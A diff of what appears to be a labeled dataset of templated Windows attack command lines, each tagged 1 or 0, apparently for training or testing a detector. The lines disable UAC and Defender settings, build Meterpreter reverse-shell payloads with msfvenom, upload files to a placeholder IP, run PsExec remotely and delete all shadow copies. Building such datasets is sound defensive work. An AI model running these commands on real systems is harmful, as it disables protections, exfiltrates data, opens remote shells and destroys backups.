@@ -1,6 +1,16 @@
-1	sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
-1	certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
-1	Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
-0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v ${value_name} /t REG_DWORD /d ${value}
-0	cmd.exe /c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+1	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+1	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+1	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+1	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+1	powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+1	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+1	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+1	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+0	powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+0	msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	powershell -c "mstsc.exe /v:${ip_address} /admin"
+0	vssadmin Delete Shadows /All /quiet
+0	cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
+0	cmd /c "choco install winscp"
+0	powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
